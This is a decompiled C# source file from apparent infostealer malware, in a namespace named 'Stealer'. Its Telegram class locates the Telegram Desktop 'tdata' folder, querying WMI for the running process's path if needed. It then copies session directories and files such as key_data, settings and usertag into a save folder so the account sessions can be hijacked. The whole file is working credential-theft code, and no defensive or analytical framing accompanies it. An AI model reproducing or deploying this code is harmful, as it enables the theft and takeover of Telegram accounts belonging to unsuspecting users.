using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealer
{
	// Token: 0x02000003 RID: 3
	public static class Telegram
	{
		// Token: 0x06000004 RID: 4 RVA: 0x000022C4 File Offset: 0x000004C4
		private static string GetTdata()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			bool flag = processesByName.Length == 0;
			string result;
			if (flag)
			{
				result = text;
			}
			else
			{
				result = Path.Combine(Path.GetDirectoryName(Telegram.ProcessExecutablePath(processesByName[0])), "tdata");
			}
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002328 File Offset: 0x00000528
		public static bool GetTelegramSessions(string sSaveDir)
		{
			string tdata = Telegram.GetTdata();
			bool result;
			try
			{
				bool flag = !Directory.Exists(tdata);
				if (flag)
				{
					result = false;
				}
				else
				{
					Directory.CreateDirectory(sSaveDir);
					string[] directories = Directory.GetDirectories(tdata);
					string[] files = Directory.GetFiles(tdata);
					foreach (string text in directories)
					{
						string name = new DirectoryInfo(text).Name;
						bool flag2 = name.Length == 16;
						if (flag2)
						{
							string destFolder = Path.Combine(sSaveDir, name);
							Telegram.CopyDirectory(text, destFolder);
						}
					}
					foreach (string fileName in files)
					{
						FileInfo fileInfo = new FileInfo(fileName);
						string name2 = fileInfo.Name;
						string destFileName = Path.Combine(sSaveDir, name2);
						bool flag3 = fileInfo.Length > 5120L;
						if (!flag3)
						{
							bool flag4 = name2.EndsWith("s") && name2.Length == 17;
							if (flag4)
							{
								fileInfo.CopyTo(destFileName);
							}
							else
							{
								bool flag5 = name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data");
								if (flag5)
								{
									fileInfo.CopyTo(destFileName);
								}
							}
						}
					}
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000024DC File Offset: 0x000006DC
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			bool flag = !Directory.Exists(destFolder);
			if (flag)
			{
				Directory.CreateDirectory(destFolder);
			}
			string[] files = Directory.GetFiles(sourceFolder);
			foreach (string text in files)
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(destFolder, fileName);
				File.Copy(text, destFileName);
			}
			string[] directories = Directory.GetDirectories(sourceFolder);
			foreach (string text2 in directories)
			{
				string fileName2 = Path.GetFileName(text2);
				string destFolder2 = Path.Combine(destFolder, fileName2);
				Telegram.CopyDirectory(text2, destFolder2);
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002598 File Offset: 0x00000798
		public static string ProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				string queryString = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					bool flag = obj2 != null && obj.ToString() == process.Id.ToString();
					if (flag)
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}
	}
}
